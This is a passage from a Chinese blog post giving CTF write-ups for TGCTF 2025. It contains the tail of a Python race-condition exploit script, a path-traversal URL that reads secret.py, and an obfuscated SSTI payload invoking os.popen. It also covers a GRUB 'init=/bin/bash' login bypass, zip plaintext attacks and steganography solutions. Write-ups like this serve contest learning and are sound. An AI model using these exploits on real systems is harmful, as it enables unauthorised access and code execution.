            tasks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>raceValidationCheck<span class="token punctuation">(</span>session<span class="token punctuation">,</span> self<span class="token punctuation">.</span>INVALID_CHECK_PARAMETER<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token keyword">await</span> asyncio<span class="token punctuation">.</span>gather<span class="token punctuation">(</span><span class="token operator">*</span>tasks<span class="token punctuation">)</span>

    <span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">solve</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">async</span> <span class="token keyword">with</span> aiohttp<span class="token punctuation">.</span>ClientSession<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>
            <span class="token keyword">await</span> asyncio<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># wait for the reverse proxy creation</span>

            attempts <span class="token operator">=</span> <span class="token number">1</span>
            finishedRaceConditionJobs <span class="token operator">=</span> <span class="token number">0</span>
            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[*] Attempts #</span><span class="token interpolation"><span class="token punctuation">&#123;</span>attempts<span class="token punctuation">&#125;</span></span><span class="token string"> - Finished race condition jobs: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>finishedRaceConditionJobs<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">'\r'</span><span class="token punctuation">)</span>

                results <span class="token operator">=</span> <span class="token keyword">await</span> self<span class="token punctuation">.</span>raceCondition<span class="token punctuation">(</span>session<span class="token punctuation">)</span>
                attempts <span class="token operator">+=</span> <span class="token number">1</span>
                finishedRaceConditionJobs <span class="token operator">+=</span> self<span class="token punctuation">.</span>RACE_CONDITION_JOBS
                <span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
                    <span class="token keyword">if</span> <span class="token string">'TGCTF&#123;'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>
                        <span class="token keyword">continue</span>

                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'\n[+] We won the race window! Flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
                    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> name <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    baseUrl <span class="token operator">=</span> <span class="token string">'http://node1.tgctf.woooo.tech:30308'</span> <span class="token comment"># for local testing</span>
    <span class="token comment"># baseUrl = 'http://49.13.169.154:8088'</span>
    solver <span class="token operator">=</span> Solver<span class="token punctuation">(</span>baseUrl<span class="token punctuation">)</span>

    asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>solver<span class="token punctuation">.</span>solve<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<h3 id="直面天命（复仇）"><a href="#直面天命（复仇）" class="headerlink" title="直面天命（复仇）"></a>直面天命（复仇）</h3><p>直接去非复仇版本里读：</p>
<p><a target="_blank" rel="noopener" href="http://node1.tgctf.woooo.tech:31514/aazz?filename=a/b/c/d/secret.py">http://node1.tgctf.woooo.tech:31514/aazz?filename=a/b/c/d/secret.py</a></p>
<p>secret_key &#x3D; “直面天命”</p>
<p>然后标准SSTI即可。unicode编码绕过。 。 直面天命g’\u0070\u006f\u0070’’\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f’(‘so’[::-1])’\u0070\u006f\u0070\u0065\u006e’’\u0072\u0065\u0061\u0064’难违</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="next-is-the-end"><a href="#next-is-the-end" class="headerlink" title="next is the end"></a>next is the end</h3><p>手动打开文件夹，得到flag。</p>
<p><img src="/images/1744633170179-41.png" alt="img" loading="lazy"></p>
<h3 id="where-it-is"><a href="#where-it-is" class="headerlink" title="where_it_is"></a>where_it_is</h3><p>百度识图找到另一个视角的正面图。</p>
<p><img src="/images/1744633170179-42.png" alt="img" loading="lazy"></p>
<p>可以模糊看出学校名前两个字**”内湖”**，结合原图的职业二字，在360地图搜索找到对应学校。</p>
<p><img src="/images/1744633170179-43.png" alt="img" loading="lazy"></p>
<p>旁边的站就是港墘站</p>
<p>TGCTF{港墘站}</p>
<h3 id="你的运气是好是坏？"><a href="#你的运气是好是坏？" class="headerlink" title="你的运气是好是坏？"></a>你的运气是好是坏？</h3><p>CTF自然常数（。</p>
<p>flag{114514}</p>
<h3 id="TeamGipsy-ctfer"><a href="#TeamGipsy-ctfer" class="headerlink" title="TeamGipsy&amp;ctfer"></a>TeamGipsy&amp;ctfer</h3><p>vm运行虚拟机，发现有密码。</p>
<p>在开机时按shift，再按e修改，把ro quiet splash $vt_handoff修改为rw init&#x3D;&#x2F;bin&#x2F;bash，再按F10启动。</p>
<p>然后找到用户名，修改密码为123即可。</p>
<p><img src="/images/1744633170179-44.png" alt="img" loading="lazy"></p>
<p>桌面存在一个mimi.txt记录着之前的指令，发现之前启了两个容器，并且有mysql数据库。</p>
<p><img src="/images/1744633170179-45.png" alt="img" loading="lazy"></p>
<p>重新start之前的docker，并且用文本文件里面的mysql密码连上flag，在其中一个docker的mysql数据库中可以找到flag。</p>
<p><img src="/images/1744633170179-46.png" alt="img" loading="lazy"></p>
<p><img src="/images/1744633170179-47.png" alt="img" loading="lazy"></p>
<p>HZNUCTF{0H!_YOu_are_really_the_TeamGipsy_ctfer}</p>
<h3 id="ez-zip"><a href="#ez-zip" class="headerlink" title="ez_zip"></a>ez_zip</h3><p>最外层直接爆破出zip密码为20250412，得到一个sh512.txt和End.zip，sh512.txt里面有一句话。</p>
<p>打开End.zip发现里面是End文件夹以及flag.zip和一个sh512.txt，并且sh512.txt原大小为128字节。</p>
<p>所以可知要将sh512.txt内容进行sha512加密，构建一个End.zip，进行明文爆破。</p>
<p><img src="/images/1744633170179-48.png" alt="img" loading="lazy"></p>
<p>将sha512结果存放End&#x2F;sh512.txt</p>
<p><img src="/images/1744633170179-49.png" alt="img" loading="lazy"></p>
<p>deflate压缩，压缩等级1。</p>
<p><img src="/images/1744633170179-50.png" alt="img" loading="lazy"></p>
<p>使用ARCHPR进行明文攻击解压出flag.zip。</p>
<p><img src="/images/1744633170179-51.png" alt="img" loading="lazy"></p>
<p>没法正常解压，使用010的zip模板进行修复。</p>
<p>将frFileNameLength改为8，压缩方式改成DEFLATE保存，即可解压得到flag。</p>
<p><img src="/images/1744633170179-52.png" alt="img" loading="lazy"></p>
<p><img src="/images/1744633170179-53.png" alt="img" loading="lazy"></p>
<p>TGCTF{Warrior_You_have_defeated_the_giant_dragon!}</p>
<h3 id="这是啥o-o"><a href="#这是啥o-o" class="headerlink" title="这是啥o_o"></a>这是啥o_o</h3><p>给了一个gif发现后面有疑似二维码的碎片,拼接得到一个汉信码</p>
<p><img src="/images/1744633170179-54.png" alt="img" loading="lazy"></p>
<p>扫描得到提示 time is your fortune ,efficiency is your life</p>
<p>推测和gif的延迟时间有关,修改010的gif模板,打印一下延迟时间得到一组看起来就很像asicc的东西</p>
<p><img src="/images/1744633170179-55.png" alt="img" loading="lazy"></p>
<p>解码得到flag</p>
<pre class="language-Plain" data-language="Plain"><code class="language-Plain">enc&#x3D;[84,71,67,84,70,123,89,111,117,95,99,97,117,103,104,116,95,117,112,95,119,105,116,104,95,116,105,109,101,33,125]
for i in enc:
    print(chr(i),end&#x3D;&#39;&#39;)</code></pre>

<blockquote>
<p>TGCTF{You_caught_up_with_time!}</p>
</blockquote>
<h3 id="你能发现图中的秘密吗"><a href="#你能发现图中的秘密吗" class="headerlink" title="你能发现图中的秘密吗?"></a>你能发现图中的秘密吗?</h3><p>题目给出一个压缩包和一个png,压缩包有密码</p>
<p>png查看red通道的lsb,发现密钥</p>
<p><img src="/images/1744633170179-56.png" alt="img" loading="lazy"></p>
<p>解压后给了一个png一个pdf</p>
<p>查看pdf的二进制数据发现有ps相关的东西,用ps打开,发现了隐藏的flag图层查看获得第二段flag</p>
<p><img src="/images/1744633170179-57.png" alt="img" loading="lazy"></p>
<p>final_challenge2.png的一个chunk大小异常。</p>
<p><img src="/images/1744633170179-58.png" alt="img" loading="lazy"></p>
<p>提取，补上png文件头文件尾，然后爆破宽高就可以找到正确的宽高图片。</p>
<p><img src="/images/1744633170179-59.png" alt="img" loading="lazy"></p>
<p>flag{you_are_so_attentive_and_conscientous}</p>
</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">吐刀乐！</div><div id="qr" style="display:none;"><div style="display:inline-block"></div><div style="display:inline-block"></div><div style="display:inline-block"></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>不知道</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://example.com/2025/04/14/TGCTF25-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/" title="TGCTF25 不知道 WP">http://example.com/2025/04/14/TGCTF25-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2025/04/14/NCTF24-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/" rel="next" title="NCTF24 不知道 WP"><span class="post-nav-text">NCTF24 不知道 WP</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>欢迎留言~</span><br></div><div class="toggle-comment-system" style="margin: 1rem auto"><a class="toggle-comment-btn hty-button hty-button--raised text-uppercase" data-target="#waline" onclick="showComment(this.dataset.target)">waline</a><style>.utterances {
  display: none;
}</style><a class="toggle-comment-btn hty-button hty-button--raised text-uppercase" data-target=".utterances" onclick="showComment(this.dataset.target)">utterances</a><script>function hideAllComment() {
  //- hide all
  document.querySelectorAll('.toggle-comment-btn').forEach((btn) => {
    const container = document.querySelector(btn.dataset.target);
    if (container) {
      container.style.display = "none";
    }
  });
}
function showComment(target) {
  hideAllComment();
  //- show target
  const targetContainer = document.querySelector(target);
  if (targetContainer) {
    targetContainer.style.display = "block";
  }
}
</script></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> 不知道</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#6200ee" stroke-width="2" stroke-linecap="round"></circle></svg></a></body></html>